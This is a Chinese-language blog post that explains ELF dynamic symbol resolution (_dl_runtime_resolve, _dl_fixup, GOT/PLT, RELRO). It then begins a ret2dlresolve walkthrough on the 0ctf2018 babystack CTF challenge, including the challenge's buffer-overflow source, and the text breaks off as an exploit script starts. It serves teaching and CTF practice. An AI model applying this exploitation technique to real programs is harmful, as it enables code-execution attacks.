<td style="text-align:center"><code>#define DT_STRTAB 5</code>（0x5）</td>
<td style="text-align:center">动态链接<strong>字符串</strong>表的地址，d_ptr表示<code>.dynstr</code>的地址 (Address of string table)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_SYMTAB 6</code>（0x6）</td>
<td style="text-align:center">动态链接<strong>符号表</strong>的地址，d_ptr表示<code>.dynsym</code>的地址 (Address of symbol table)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_JMPREL 23</code>（0x17）</td>
<td style="text-align:center">动态链接<strong>重定位表</strong>的地址，d_ptr表示<code>.rel.plt</code>的地址 (Address of PLT relocs)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_RELENT 19</code>（0x13）</td>
<td style="text-align:center">单个重定位表项的大小，d_val表示单个重定位表项大小 (Size of one Rel reloc )</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_SYMENT 11</code>（0xb）</td>
<td style="text-align:center">单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry )</td>
</tr>
</tbody>
</table>
</div>
<p>32位：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640187099021-1640267844289.png" class width="1640187099021"> 
<p>64位：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640192939551-1640267844289.png" class width="1640192939551"> 
<p>​        //64位和32位有些许不同：32位，DT_RELENT(0x13)；64位，DT_RELAENT(0x9)</p>
<p>现在开始对最为重要的3个表进行介绍：</p>
<p><strong>重定位表(jmprel)</strong> ：位于rel.plt段，有结构体 <strong>Elf_Rel</strong> ，中包含了需要 <strong>重定位的函数</strong> 的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;	<span class="comment">// 重定位入口的偏移</span></span><br><span class="line">    Elf32_Word  r_info; 	<span class="comment">// 重定位入口的类型（低8位，1字节）</span></span><br><span class="line">	<span class="comment">// 符号在符号表中的下标（高24位，3字节）</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640276847960.png" class width="1640276847960">  
<p>​        //程序将对got表进行重定位，所以got表首地址就是“重定位入口”</p>
<p><strong>符号表(symtab)</strong> ：位于dynsym段，有结构体 <strong>Elf_Sym</strong> ，用于记录符号的<strong>关键信息</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//表示该成员在字符串表中的下标</span></span><br><span class="line">  Elf32_Addr    st_value; <span class="comment">//将要解析的函数在libc中的偏移地址</span></span><br><span class="line">  Elf32_Word    st_size; <span class="comment">//符号长度</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640189548821-1640267844290.png" class width="1640189548821">  
<p><strong>字符串表(strtab)</strong>：位于dynstr段，无结构体，用于存储<strong>存储dysym符号表中的符号</strong></p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640189533816-1640267844290.png" class width="1640189533816"> 
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-1835494-id-2831799.html">http://blog.chinaunix.net/uid-1835494-id-2831799.html</a></p>
<hr>
<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>Lazy Binding机制（延迟绑定）：即只有函数被调用时，才会对函数地址进行解析，然后将真实地址写入GOT表中，第二次调用函数时便不再进行加载</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640190989263-1640267844290.png" class width="1640190989263"> 
<p>程序第一次识别函数“function”时，跳转plt表，然后跳转got表，接着返回plt[0]，执行“lookup”</p>
<p>​        //检查函数“lookup”可以获取“function_libc”并执行，还会把它写入got表</p>
<p>在IDA中打开公共plt表：(plt[0])</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640155645830-1640267844290.png" class width="1640155645830"> 
<p>push，jmp指令后就是got表地址</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640155840997-1640267844290.png" class width="1640155840997"> 
<p>现在看上去这里没有东西，这是因为<strong>Lazy Binding</strong>在函数调用时才会进行解析</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640156356197-1640267844290.png" class width="1640156356197"> 
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640156368709-1640267844290.png" class width="1640156368709"> 
<p>got表地址中：</p>
<p>got[0]：.dynamic段的起始地址 </p>
<p>got[1]：link_map</p>
<p>got[2]：_dl_runtime_resolve 函数</p>
<p>got[3-n]：剩余的got表</p>
<p>在jmp指令执行后，相当于执行 _dl_runtime_resolve( link_map，reloc_arg ) </p>
<p>注意：在被调用函数 <strong>自己的plt表</strong> 中会push一个值，然后在 <strong>公共plt表</strong> 中又会push一个值</p>
<p>​        //其实<strong>dl_runtime_resolve</strong>就是检查函数“lookup”</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/15168342.html">https://www.cnblogs.com/unr4v31/p/15168342.html</a></p>
<hr>
<h2 id="分析dl-runtime-resolve"><a href="#分析dl-runtime-resolve" class="headerlink" title="分析dl_runtime_resolve"></a>分析dl_runtime_resolve</h2><p><strong>_dl_runtime_resolve</strong>用于对动态链接的函数进行<strong>重定位</strong>，是一段<strong>汇编语言</strong></p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640154253689-1640267844290.png" class width="1640154253689"> 
<p>1.link_map_obj：结构体link_map，包含了动态装载器加载ELF对象需要的全部信息 </p>
<p>2.reloc_arg：可以找到文件中<code>.rel.plt</code>表 ，标识了解析哪一个导入函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">   .text</span><br><span class="line">    .globl _dl_runtime_resolve</span><br><span class="line">    .type _dl_runtime_resolve, @function</span><br><span class="line">    .align <span class="number">16</span></span><br><span class="line">    cfi_startproc<span class="comment">//所有cfi开头的指令和函数检测有关，即GNU Profiler，这里不关心</span></span><br><span class="line">_dl_runtime_resolve:</span><br><span class="line">    cfi_adjust_cfa_offset(<span class="number">16</span>) </span><br><span class="line">    subq $<span class="number">56</span>,%rsp<span class="comment">//rsp-56(上移7个地址空间)</span></span><br><span class="line">    cfi_adjust_cfa_offset(<span class="number">56</span>)</span><br><span class="line">        <span class="comment">//分别把rax，rcx，rdx，rsi，rdi，r8，r9，装入栈</span></span><br><span class="line">    movq %rax,(%rsp)			<span class="comment">//	rsp+00|rax</span></span><br><span class="line">    movq %rcx, <span class="number">8</span>(%rsp)			<span class="comment">//	rsp+08|rcx</span></span><br><span class="line">    movq %rdx, <span class="number">16</span>(%rsp)			<span class="comment">//	rsp+16|rdx</span></span><br><span class="line">    movq %rsi, <span class="number">24</span>(%rsp)			<span class="comment">//	rsp+24|rsi</span></span><br><span class="line">    movq %rdi, <span class="number">32</span>(%rsp)			<span class="comment">//	rsp+32|rdi</span></span><br><span class="line">    movq %r8, <span class="number">40</span>(%rsp)			<span class="comment">//	rsp+40|r8</span></span><br><span class="line">    movq %r9, <span class="number">48</span>(%rsp)			<span class="comment">//	rsp+48|r9</span></span><br><span class="line">    movq <span class="number">64</span>(%rsp), %rsi<span class="comment">//rsp+64-&gt;rsi(第2个参数：标识了解析哪一个导入函数)</span></span><br><span class="line">    movq <span class="number">56</span>(%rsp), %rdi<span class="comment">//rsp+56-&gt;rdi(第1个参数：获取解析导入函数所需的信息)	</span></span><br><span class="line">    call _dl_fixup<span class="comment">//核心，用于解析导入函数的真实地址</span></span><br><span class="line">        <span class="comment">//把保存在栈上的数据恢复</span></span><br><span class="line">    movq %rax, %r11     </span><br><span class="line">    movq <span class="number">48</span>(%rsp), %r9  </span><br><span class="line">    movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">    movq <span class="number">32</span>(%rsp), %rdi</span><br><span class="line">    movq <span class="number">24</span>(%rsp), %rsi</span><br><span class="line">    movq <span class="number">16</span>(%rsp), %rdx</span><br><span class="line">    movq <span class="number">8</span>(%rsp), %<span class="function">rcx</span></span><br><span class="line"><span class="function">    <span class="title">movq</span> <span class="params">(%rsp)</span>, %rax</span></span><br><span class="line"><span class="function">    addq $72, %rsp<span class="comment">//rsp+72     </span></span></span><br><span class="line"><span class="function">    <span class="title">cfi_adjust_cfa_offset</span><span class="params">(<span class="number">-72</span>)</span></span></span><br><span class="line"><span class="function">    jmp *%r11       	<span class="comment">// Jump to function address</span></span></span><br><span class="line"><span class="function">    cfi_endproc</span></span><br><span class="line"><span class="function">    .size _dl_runtime_resolve, .-_dl_runtime_resolve</span></span><br></pre></td></tr></table></figure>
<p><strong>_dl_fixup：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)  _ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)    _ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)  e##w##t</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) __attribute ((noinline)) _dl_fixup ( struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br><span class="line">    <span class="comment">//ElfW为宏定义，用于根据32位或64位的计算机获取最终的变量</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">//通过参数link_map获取了‘symtab’和‘strtab’</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);						</span><br><span class="line">    <span class="comment">//1.首先通过参数reloc_arg计算：对应的Elf_Rel结构体</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//2.然后通过reloc-&gt;r_info找到：对应的Elf_Sym结构体</span></span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//这里通过r_offset获取了got表地址（不是重点内容）</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">          version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">          <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">            version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="comment">//3.接着通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line"></span><br><span class="line">      value = sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">                      + sym-&gt;st_value) : <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//4.value为libc基址加上要解析函数的偏移地址(st_value)，也即实际地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      value = l-&gt;l_addr + sym-&gt;st_value;</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//5.最后把value写入相应的GOT表条目中，并执行（不是重点内容）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说：</p>
<p>1.dl_fixup会根据参数link_map可以找到.dynamic的地址</p>
<p>2.根据.dynamic的地址分别找到.rel.plt，dynsym，dynstr的地址</p>
<p>3.通过“_dl_lookup_symbol_x”计算出libc基地址，计算得目标在libc中的真实地址</p>
<p>4.最后写入got表</p>
<p>参考：</p>
<p>AT&amp;T汇编：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0480e431f1d7">https://www.jianshu.com/p/0480e431f1d7</a></p>
<p>Link Map：<a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/Ae5RgZDrdQ/">https://www.shuzhiduo.com/A/Ae5RgZDrdQ/</a></p>
<p>重定位入口：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fr-ruiyang/p/10457817.html">https://www.cnblogs.com/fr-ruiyang/p/10457817.html</a></p>
<hr>
<h2 id="数据索引流程"><a href="#数据索引流程" class="headerlink" title="数据索引流程"></a>数据索引流程</h2><p>不管是在dl_runtime_resolve中，还是在_dl_fixup中，都有许多<strong>“数据识别”</strong>的操作</p>
<p>函数_dl_runtime_resolve执行时，它需要知道搜索哪一个函数，获取对应的 <strong>符号</strong> ，<strong>真实地址</strong> 等信息，这些都需要进行<strong>“数据识别”</strong>，那么对于每一个函数，必须有可以<strong>唯一确定</strong>它的身份的标识信息，同样，在“jmprel，symtab，strtab”中也必须有对应的标识信息来索引正确的数据</p>
<p>这个 <strong>“标识信息”</strong> 就是各个表中，各个元素的<strong>下标</strong></p>
<p>然后我们就通过分析dl_runtime_resolve的执行过程来了解<strong>下标</strong>的作用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//‘symtab’和‘strtab’分别为symtab和strtab的基地址</span></span><br><span class="line"><span class="comment">//D_PTR (l, l_info[DT_XXXX]：用于获取&#x27;symtab&#x27;,&#x27;strtab&#x27;,&#x27;jmprel&#x27;的首地址</span></span><br></pre></td></tr></table></figure>
<p>1.dl_runtime_resolve在搜索某个函数时，首先需要获取<strong>它在jmprel中的位置</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) +</span><br><span class="line">reloc_offset);						</span><br><span class="line"><span class="comment">//首先获取&#x27;jmprel&#x27;，然后加上&#x27;reloc_offset&#x27;就是目标函数在jmprel中的地址了 </span></span><br></pre></td></tr></table></figure>
<p>这里的“reloc_offset”就是<strong>目标函数在jmprel中的下标</strong>，同时也是“reloc_arg”</p>
<p>“reloc_offset” + “jmprel” = “目标函数在jmprel中对应的位置”，保存于指针reloc中，指向对应结构体Elf_Rel</p>
<p>2.通过结构体Elf_Rel中的信息，获取<strong>dynsym中目标符号的位置</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;	<span class="comment">// 重定位入口的偏移（可以定位got表地址）</span></span><br><span class="line">    Elf32_Word  r_info; 	<span class="comment">// 重定位入口的类型（低8位）</span></span><br><span class="line">    <span class="comment">// 符号在符号表中的下标（高24位）</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="comment">//reloc-&gt;r_info：存储有‘目标符号在符号表中的下标’</span></span><br><span class="line"><span class="comment">//相当于*sym = symtab[index],直接获取了目标符号的Elf_Sym结构体</span></span><br></pre></td></tr></table></figure>
<p>计算“r_info &gt;&gt; 8”得到<strong>目标函数在symtab中的下标</strong>（index）</p>
<p>“symtab[index]” = “目标符号在symtab中对应的位置”，保存于指针sym中，指向对应结构体Elf_Sym</p>
<p>3.通过结构体Elf_Sym中的信息，获取<strong>关键信息</strong>，并计算出 <strong>libc基地址</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//表示该成员在字符串表中的下标</span></span><br><span class="line">  Elf32_Addr    st_value; <span class="comment">//将要解析的函数在libc中的偏移地址</span></span><br><span class="line">  Elf32_Word    st_size; <span class="comment">//符号长度</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//sym-&gt;st_name：存储有‘该字符串在字符串表中的下标’</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x根据多种信息得出libc基地址，保存于result中</span></span><br></pre></td></tr></table></figure>
<p>这里的“st_name”就是<strong>目标字符串在strtab中的下标</strong></p>
<p>“st_name” + “strtab” = “对应的字符串”，传入_dl_lookup_symbol_x，而这个函数可以根据：link_map，sym(指向结构体Elf_Sym)，version(版本信息)，flags(标志)等各个信息综合分析，最终获取libc的基地址，保存于指针result中</p>
<p>4.根据libc基地址获取目标函数的<strong>真实地址</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value = sym ? (LOOKUP_VALUE_ADDRESS (result)+ sym-&gt;st_value) : <span class="number">0</span>;</span><br><span class="line"><span class="comment">//sym-&gt;st_value：存储有将要解析函数的偏移地址（和‘下标’不同）</span></span><br></pre></td></tr></table></figure>
<p>“result” + “st_value” = “目标函数在libc中的真实地址”，存储于value中</p>
<p>5.图表如下：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     _dl_runtime_resolve(link_map, reloc_arg)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                | <span class="comment">#jmprel[0]+reloc_arg</span></span><br><span class="line">          | Elf32_Rel | &lt;--------------+ 	</span><br><span class="line">          +-----------+		</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |	 <span class="comment">#libc_base+st_value</span></span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; |<span class="string">&#x27;system\0&#x27;</span>|</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; | 				<span class="comment">#symtab[index]</span></span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure>
<p>总而言之：</p>
<p>传入参数reloc_arg就是<strong>重定位表</strong>的下标</p>
<p>“Elf32_Rel -&gt; r_info” 的高24字节就是<strong>字符表</strong>的下标</p>
<p>“Elf32_Sym -&gt; st_name” 就是<strong>字符串表</strong>的下标</p>
<p>​        //在上一个表中，存储有下一个表的下标</p>
<hr>
<h2 id="RELRO保护机制"><a href="#RELRO保护机制" class="headerlink" title="RELRO保护机制"></a>RELRO保护机制</h2><p>系统保护机制 <strong>RELRO</strong>（Relocation Read-Only，重定位只读）</p>
<p><strong>RELRO</strong>有3种形式：</p>
<p>1.No RELRO：</p>
<p>没有RELRO，<code>.dynamic</code>段可写，所以我们可以任意修改GOT表/plt表</p>
<p>2.Partial RELRO：</p>
<p>部分RELRO，<code>.dynamic</code>段不可写，不能修改plt表但是可以修改GOT表， 该ELF文件的各个部分被重新排序</p>
<p>3.FULL RELRO：</p>
<p>完全开启RELRO，启后 <strong>立即绑定</strong> 函数地址，<code>.got</code>段只读不可写，该ELF文件的各个部分被重新排序</p>
<p><strong>FULL RELRO</strong> 可以限制 <strong>ret2dlresolve</strong> ，但是 <strong>Partial RELRO</strong> 是没有影响的</p>
<hr>
<h2 id="深入理解ret2dlresolve"><a href="#深入理解ret2dlresolve" class="headerlink" title="深入理解ret2dlresolve"></a>深入理解ret2dlresolve</h2><p>ret2dlresolve通常有3种思路：</p>
<p>思路 1 - 控制dynamic（直接修改got表）</p>
<p>思路 2 - 控制重定位表项的相关内容</p>
<p>思路 3 - 伪造 link_map</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640195986238-1640267844290.png" class width="1640195986238"> 
<p>这里我们重点分析“思路 3”：</p>
<p>函数_dl_runtime_resolve( link_map，reloc_arg )有一个漏洞：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1641226472639.png" class width="1641226472639"> 
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1641179255771.png" class width="1641179255771"> 
<p>​        //如果是32位系统，字长就变为4</p>
<p>它的参数都是直接从栈上取的，这样我们伪造栈，就可以伪造参数了</p>
<p>​        //栈顶为link_map，下一个栈空间就是reloc_arg</p>
<p>为了实现这一点，必须先进行栈转移来实现<strong>“完全控制”</strong>（输入值可以控制栈顶）</p>
<p>这里我们用经典题目 <strong>0ctf2018 babystack</strong>(32位)来介绍 <strong>ret2dlresolve</strong> 的过程：</p>
<p>此题的源文件很简单，就一个read函数，没有任何东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0xA</span>);</span><br><span class="line">  myread();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">myread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看常规攻击的exploit：（思路 3 - 伪造 link_map）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 